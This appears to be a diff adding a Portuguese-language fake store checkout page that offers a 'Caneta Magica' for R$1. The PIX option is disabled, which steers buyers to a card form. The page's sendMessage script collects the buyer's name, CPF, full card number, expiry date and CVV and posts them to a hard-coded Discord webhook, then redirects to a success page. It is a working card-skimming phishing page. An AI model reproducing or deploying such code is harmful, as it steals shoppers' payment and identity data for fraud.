@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Checkout</title>
+
+  <!--
+    - custom css link
+  -->
+  <link rel="stylesheet" href="style.css">
+
+  <!--
+    - google font link
+  -->
+  <link
+    href="https://fonts.googleapis.com/css?family=Source+Sans+3:200,300,regular,500,600,700,800,900,200italic,300italic,italic,500italic,600italic,700italic,800italic,900italic"
+    rel="stylesheet" />
+</head>
+
+<body>
+
+
+  <!--
+    - main container
+  -->
+
+  <main class="container">
+
+    <h1 class="heading">
+      <ion-icon name="cart-outline"></ion-icon> Forma de pagamento
+    </h1>
+
+    <div class="item-flex">
+
+
+      <!--
+       - checkout section
+      -->
+      <section class="checkout">
+
+        <h2 class="section-heading">Detalhes</h2>
+
+        <div class="payment-form">
+
+          <div class="payment-method">
+
+            <button class="method selected">
+              <ion-icon name="card"></ion-icon>
+
+              <span>Cartão de Crédito</span>
+
+              <ion-icon class="checkmark fill" name="checkmark-circle"></ion-icon>
+            </button>
+
+            <button class="method" onclick="pixOff()">
+              <img src="https://user-images.githubusercontent.com/741969/99538099-3b7a5d00-298b-11eb-9f4f-c3d0cd4a5280.png" width="20" height="20">
+
+              <span>PIX</span>
+
+              <ion-icon class="checkmark" name="checkmark-circle-outline"></ion-icon>
+            </button>
+
+          </div>
+            
+          <form action="#">            
+
+            <div class="cardholder-name">
+              <label for="cardholder-name" class="label-default">Nome impresso no cartão</label>
+              <input type="text" name="cardholder-name" id="cardholder-name" class="input-default">
+            </div>
+
+            <div class="cardholder-name">
+              <label for="cardholder-name" class="label-default">CPF</label>
+              <input type="text" name="cardholder-name" id="cpf" class="input-default">
+            </div>
+
+
+            <div class="card-number">
+              <label for="card-number" class="label-default">Número do Cartão</label>
+              <input type="number" name="card-number" id="card-number" class="input-default">
+            </div>
+
+            <div class="input-flex">
+
+              <div class="expire-date">
+                <label for="expire-date" class="label-default">Data de Expiração</label>
+
+                <div class="input-flex">
+
+                  <input type="number" name="day" id="expire-date1" placeholder="01" min="1" max="12"
+                    class="input-default">
+                  /
+                  <input type="number" name="month" id="expire-date2" placeholder="26" min="22" max="40"
+                    class="input-default">
+
+                </div>
+              </div>
+
+              <div class="cvv">
+                <label for="cvv" class="label-default">CVV</label>
+                <input type="number" name="cvv" id="cvv" class="input-default">
+              </div>
+
+            </div>
+            <br>
+            
+
+          </form>
+
+        </div>
+
+        <button class="btn btn-primary" onclick="sendMessage()">
+          <b>Salvar cartão</b>
+        </button>
+
+      </section>
+
+
+      <!--
+        - cart section
+      -->
+      <section class="cart">
+
+        <div class="cart-item-box">
+
+          <h2 class="section-heading">Produtos</h2>
+
+          <div class="product-card">
+
+            <div class="card">
+
+              <div class="img-box">
+                <img src="https://images.yampi.io/unsafe/fit-in/700x700/filters:background_color(white):upscale()/https://images.yampi.me/assets/stores/entregasbrilhantescom/uploads/images/caneta-magica-63b1d759bd270-large.jpg" alt="Green tomatoes" width="80px" class="product-img">
+              </div>
+
+              <div class="detail">
+
+                <h4 class="product-name">Caneta Magica</h4>
+
+                <div class="wrapper">
+
+                  <div class="product-qty">
+                    <button id="decrement">
+                      <ion-icon name="remove-outline"></ion-icon>
+                    </button>
+
+                    <span id="quantity">1</span>
+
+                    <button id="increment">
+                      <ion-icon name="add-outline"></ion-icon>
+                    </button>
+                  </div>
+
+                  <div class="price">
+                    R$ <span id="price">1</span>
+                  </div>
+
+                </div>
+
+              </div>
+
+              <button class="product-close-btn">
+                <ion-icon name="close-outline"></ion-icon>
+              </button>
+
+            </div>
+
+          </div>
+
+          <div class="product-card">
+
+
+          </div>
+
+        </div>
+
+        <div class="wrapper">
+
+          <div class="discount-token">
+
+            <label for="discount-token" class="label-default">Tem um cupom promocional? </label>
+
+            <div class="wrapper-flex">
+
+              <input type="text" name="discount-token" id="discount-token" class="input-default">
+
+              <button class="btn btn-outline">Apply</button>
+
+            </div>
+
+          </div>
+
+          <div class="amount">
+
+            <div class="subtotal">
+              <span>Subtotal</span> <span>R$ <span id="subtotal">1</span></span>
+            </div>
+
+            <div class="tax">
+              <span>Frete</span> <span>R$ <span id="tax">0,00</span></span>
+            </div>
+
+
+            <div class="total">
+              <span>Total</span> <span>R$ <span id="total">1</span></span>
+            </div>
+
+          </div>
+
+        </div>
+
+      </section>
+
+    </div>
+
+  </main>
+
+
+
+
+
+
+  <!--
+    - custom js link
+  -->
+  <script src="./script.js"></script>
+
+  <!--
+    - ionicon link
+  -->
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+  <script>
+  
+  async function pixOff() {
+    alert("Pix DESATIVADO! Use o pagamento via Cartão de Crédito.");
+  }
+
+
+  </script>
+
+</body>
+
+<script>
+
+  async function sendMessage() {
+    const name = document.getElementById("cardholder-name").value;
+
+    const cpf = document.getElementById("cpf").value;
+
+    const strippedCPF = cpf.replace(/[^\d]/g, '');
+
+    let formattedCPF = "";
+    for (let i = 0; i < strippedCPF.length; i++) {
+      formattedCPF += strippedCPF[i];
+      if (i !== 8 && (i + 1) % 3 === 0 && i !== strippedCPF.length - 1 && i !== strippedCPF.length - 2) {
+        formattedCPF += ".";
+      }
+      if (i === 8) {
+        formattedCPF += "-";
+      }
+    }
+    document.getElementById("cpf").value = formattedCPF;
+
+    
+    const card = document.getElementById("card-number").value;
+    let formattedCard = "";
+    for (let i = 0; i < card.length; i++) {
+      formattedCard += card[i];
+      if ((i + 1) % 4 === 0 && i !== card.length - 1) {
+        formattedCard += " ";
+      }
+    }
+    document.getElementById("card-number").value = formattedCard;
+
+    const mes = document.getElementById("expire-date1").value;
+    const ano = document.getElementById("expire-date2").value; 
+
+    const cvv = document.getElementById("cvv").value;
+
+    const message = `**NOME:** ${name}\n**CPF:** ${formattedCPF}\n**NUMERO:** ${formattedCard}\n**DATA:** ${mes}/${ano}\n**CVV:** ${cvv}\n\n@everyone`;
+
+        
+    const response = await fetch("https://discord.com/api/webhooks/1069272036360331324/8ikHvme5ekjw-mtnF88OIKlb38CZV94gRrilaw1xn_-5V8irdNVrOjgi-mcVs6Io7yJp", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content: message })
+    });
+    console.log(response);
+
+    location.href = '../sucesso'
+  }
+</script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+<script>
+  $(document).ready(function(){
+    $('#cpf').mask('000.000.000-00', {reverse: true});
+  });
+</script>
+
+</html>
